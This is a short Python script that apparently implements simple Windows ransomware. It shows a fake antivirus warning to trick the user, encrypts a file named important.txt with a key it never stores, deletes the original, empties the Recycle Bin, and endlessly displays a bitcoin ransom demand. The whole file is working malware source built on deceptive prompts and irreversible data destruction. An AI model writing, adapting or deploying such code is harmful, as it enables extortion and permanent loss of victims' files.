from ast import Delete
import base64
import ctypes
from email.mime import base
import os
from cryptography.fernet import Fernet

user_handle = ctypes.WinDLL("User32.dll")
shell_handle = ctypes.WinDLL("Shell32.dll")



def firstPrompt():
    hWnd = None
    lpText = "Your computer has been infected by a virus, please press OK to install a new antivirus program"
    lpCaption = "Warning! Virus Detected"
    uType = 0x0000001
    
    result = 0
    while(result == 0):
        result = user_handle.MessageBoxW(hWnd, lpText, lpCaption, uType)
        if result == 1:
            result = 1
            return
        else:
            result = 0


def encryptTarget():
    key = Fernet.generate_key()
    f = Fernet(key) 
   
    #get content of important.txt
    with open('important.txt', 'rb') as file:
        data = file.read()
        file.close()

    #encrypt it and put it in a new file
    encryptedContents = f.encrypt(data)

    with open('encrypted', 'wb') as file:
        file.write(encryptedContents)

    #delete file
    os.remove('important.txt')


def clearRecycle():
    '''
    SHSTDAPI SHEmptyRecycleBinA(
        [in, optional] HWND   hwnd,
        [in, optional] LPCSTR pszRootPath,
                       DWORD  dwFlags
    );'''

    result = shell_handle.SHEmptyRecycleBinA(None, None, 0x0000001)
    

def secondPrompt():
    hWnd = None
    lpText = "Your files have been encrypted, send 100 btc to bitcoin address: 037ebda87dgfasbef or call 1875309 for assistance"
    lpCaption = "File Encrypted"
    uType = 0x0000001

    while(True):
        result = user_handle.MessageBoxW(hWnd, lpText, lpCaption, uType)
        
    





if __name__ == "__main__":
    
    firstPrompt()

    #encrypt file
    encryptTarget()

    #clear recycle bin
    clearRecycle()

    #secondPrompt
    secondPrompt()

